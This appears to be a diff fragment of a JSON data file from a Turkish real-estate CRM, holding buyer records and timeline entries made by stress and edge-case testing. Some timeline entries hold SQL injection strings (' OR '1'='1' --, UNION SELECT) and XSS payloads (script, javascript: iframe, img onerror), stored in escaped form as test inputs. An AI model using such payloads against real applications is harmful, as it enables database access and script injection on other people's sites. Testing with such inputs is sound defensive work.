+        "note": "Teklif: 35.000.000 ₺ | Aşama: Gizli Teklif",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518255",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "note": "Teklif: 19.750.000 ₺ | Aşama: Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "date": "01.11.2026 10:30",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518166",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "note": "Teklif: 50.000.000 ₺ | Aşama: Büyük Veri",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518165",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "note": "Teklif: 10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 -- | Aşama: Pazarlık&#x27; OR 1=1 --",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518164",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: &lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "note": "Teklif: 15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt; | Aşama: Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518163",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "note": "Teklif: Kat Karşılığı &amp; Takas | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518163",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "note": "Teklif: 999.999.999.999 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518162",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "note": "Teklif: -5.000.000 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518161",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (0 TL Zero Offer)",
+        "note": "Teklif: 0 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518160",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Telefon Vermeyen Gizli Yatırımcı",
+        "note": "Teklif: 35.000.000 ₺ | Aşama: Gizli Teklif",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518159",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "note": "Teklif: 19.750.000 ₺ | Aşama: Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "date": "01.11.2026 10:29",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518012",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Massive Payload Buyer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "note": "Teklif: 50.000.000 ₺ | Aşama: Büyük Veri",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518011",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: SQLi Test&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --",
+        "note": "Teklif: 10.000.000 ₺&#x27; UNION SELECT 1,2,3,4,5,6,7,8,9 -- | Aşama: Pazarlık&#x27; OR 1=1 --",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518010",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: &lt;script&gt;alert(&#x27;XSS_ATTACK_NAME&#x27;)&lt;/script&gt;",
+        "note": "Teklif: 15.000.000 ₺&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt; | Aşama: Yeni Talep&lt;img src=x onerror=alert(&#x27;XSS_STAGE&#x27;)&gt;",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518009",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Non-numeric String Offer (&#x27;Kat Karşılığı &amp; Takas&#x27;))",
+        "note": "Teklif: Kat Karşılığı &amp; Takas | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518009",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Massive Offer (999.999.999.999 ₺))",
+        "note": "Teklif: 999.999.999.999 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518008",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (Negative Offer (-5.000.000 ₺))",
+        "note": "Teklif: -5.000.000 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518007",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Extreme Tester (0 TL Zero Offer)",
+        "note": "Teklif: 0 ₺ | Aşama: Teklif Testi",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518007",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Telefon Vermeyen Gizli Yatırımcı",
+        "note": "Teklif: 35.000.000 ₺ | Aşama: Gizli Teklif",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518006",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Ömer Şafak Çelik (İncek &amp; Ümitköy Adayı)",
+        "note": "Teklif: 19.750.000 ₺ | Aşama: Pazarlık Aşaması (Şentepe &amp; Çankaya)",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "audit_concurrency_listing_1793518013": {
+    "refId": "audit_concurrency_listing_1793518013",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793518013_761",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "phone": "+90 532 999 19 19",
+        "offer": "14.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 19 timestamp 1793518013.3706155",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_651",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "phone": "+90 532 999 20 20",
+        "offer": "15.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 20 timestamp 1793518013.3717377",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_151",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "phone": "+90 532 999 18 18",
+        "offer": "14.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 18 timestamp 1793518013.3706155",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_360",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "phone": "+90 532 999 17 17",
+        "offer": "14.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 17 timestamp 1793518013.3702185",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_767",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "phone": "+90 532 999 16 16",
+        "offer": "14.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 16 timestamp 1793518013.3692193",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_288",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "phone": "+90 532 999 15 15",
+        "offer": "13.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 15 timestamp 1793518013.368221",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_413",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "phone": "+90 532 999 14 14",
+        "offer": "13.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 14 timestamp 1793518013.366219",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_294",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "phone": "+90 532 999 12 12",
+        "offer": "13.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 12 timestamp 1793518013.3652217",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_731",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "phone": "+90 532 999 11 11",
+        "offer": "12.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 11 timestamp 1793518013.3642142",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_975",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "phone": "+90 532 999 13 13",
+        "offer": "13.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 13 timestamp 1793518013.3652217",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_106",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "phone": "+90 532 999 10 10",
+        "offer": "12.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 10 timestamp 1793518013.3642142",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_988",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "phone": "+90 532 999 09 09",
+        "offer": "12.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 9 timestamp 1793518013.3631735",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_713",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "phone": "+90 532 999 07 07",
+        "offer": "11.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 7 timestamp 1793518013.3609486",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_919",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "phone": "+90 532 999 08 08",
+        "offer": "12.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 8 timestamp 1793518013.3616228",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_904",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "phone": "+90 532 999 04 04",
+        "offer": "11.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 4 timestamp 1793518013.3573265",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_873",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "phone": "+90 532 999 05 05",
+        "offer": "11.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 5 timestamp 1793518013.3583677",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_214",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "phone": "+90 532 999 06 06",
+        "offer": "11.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 6 timestamp 1793518013.3588872",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_855",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "phone": "+90 532 999 02 02",
+        "offer": "10.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 2 timestamp 1793518013.3557758",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_114",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "phone": "+90 532 999 03 03",
+        "offer": "10.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 3 timestamp 1793518013.3568056",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      },
+      {
+        "id": "b_1793518013_876",
+        "refId": "audit_concurrency_listing_1793518013",
+        "name": "Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "phone": "+90 532 999 01 01",
+        "offer": "10.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 1 timestamp 1793518013.354589",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:26"
+      }
+    ],
+    "timeline": [
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "note": "Teklif: 14.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "note": "Teklif: 15.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "note": "Teklif: 14.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "note": "Teklif: 14.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "note": "Teklif: 14.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "note": "Teklif: 13.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "note": "Teklif: 13.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "note": "Teklif: 13.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #11 (Kemal Koç)",
+        "note": "Teklif: 12.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "note": "Teklif: 13.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "note": "Teklif: 12.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #09 (Kemal Koç)",
+        "note": "Teklif: 12.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #07 (Kemal Koç)",
+        "note": "Teklif: 11.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #08 (Kemal Koç)",
+        "note": "Teklif: 12.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #04 (Kemal Koç)",
+        "note": "Teklif: 11.000.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #05 (Kemal Koç)",
+        "note": "Teklif: 11.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #06 (Kemal Koç)",
+        "note": "Teklif: 11.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #02 (Kemal Koç)",
+        "note": "Teklif: 10.500.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #03 (Kemal Koç)",
+        "note": "Teklif: 10.750.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      },
+      {
+        "id": "t_1793518013",
+        "type": "buyer",
+        "title": "Yeni Alıcı Eklendi: Eşzamanlı Alıcı #01 (Kemal Koç)",
+        "note": "Teklif: 10.250.000 ₺ | Aşama: Pazarlık Aşaması",
+        "date": "01.11.2026 10:26",
+        "author": "Yiğit Narin"
+      }
+    ]
+  },
+  "audit_concurrency_listing_1793518167": {
+    "refId": "audit_concurrency_listing_1793518167",
+    "platform_stats": [
+      {
+        "platform": "SAHIBINDEN",
+        "logo": "🟡",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "HEPSIEMLAK",
+        "logo": "🔴",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "EMLAKJET",
+        "logo": "🟣",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "COLDWELL BANKER",
+        "logo": "🔵",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "BRANDA / AFİŞ",
+        "logo": "🟠",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      },
+      {
+        "platform": "SOSYAL MEDYA & AD",
+        "logo": "🟢",
+        "views": 0,
+        "favorites": 0,
+        "messages": 0,
+        "calls": 0,
+        "influence": 0,
+        "score": 0
+      }
+    ],
+    "buyers": [
+      {
+        "id": "b_1793518167_256",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #19 (Kemal Koç)",
+        "phone": "+90 532 999 19 19",
+        "offer": "14.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 19 timestamp 1793518167.1444852",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_681",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #20 (Kemal Koç)",
+        "phone": "+90 532 999 20 20",
+        "offer": "15.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 20 timestamp 1793518167.1454835",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_507",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #18 (Kemal Koç)",
+        "phone": "+90 532 999 18 18",
+        "offer": "14.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 18 timestamp 1793518167.1434839",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_157",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #17 (Kemal Koç)",
+        "phone": "+90 532 999 17 17",
+        "offer": "14.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 17 timestamp 1793518167.1434839",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_196",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #14 (Kemal Koç)",
+        "phone": "+90 532 999 14 14",
+        "offer": "13.500.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 14 timestamp 1793518167.1413412",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_297",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #16 (Kemal Koç)",
+        "phone": "+90 532 999 16 16",
+        "offer": "14.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 16 timestamp 1793518167.1413412",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_292",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #15 (Kemal Koç)",
+        "phone": "+90 532 999 15 15",
+        "offer": "13.750.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 15 timestamp 1793518167.1413412",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_351",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #12 (Kemal Koç)",
+        "phone": "+90 532 999 12 12",
+        "offer": "13.000.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 12 timestamp 1793518167.1392736",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_427",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #13 (Kemal Koç)",
+        "phone": "+90 532 999 13 13",
+        "offer": "13.250.000 ₺",
+        "stage": "Pazarlık Aşaması",
+        "note": "Eşzamanlı stres testi alıcısı index 13 timestamp 1793518167.1403039",
+        "listingTitle": "BEYTEPE REZİDANS 4+1 KULE DAİRE",
+        "createdAt": "01.11.2026 10:29"
+      },
+      {
+        "id": "b_1793518167_360",
+        "refId": "audit_concurrency_listing_1793518167",
+        "name": "Eşzamanlı Alıcı #10 (Kemal Koç)",
+        "phone": "+90 532 999 10 10",
+        "offer": "12.500.000 ₺",
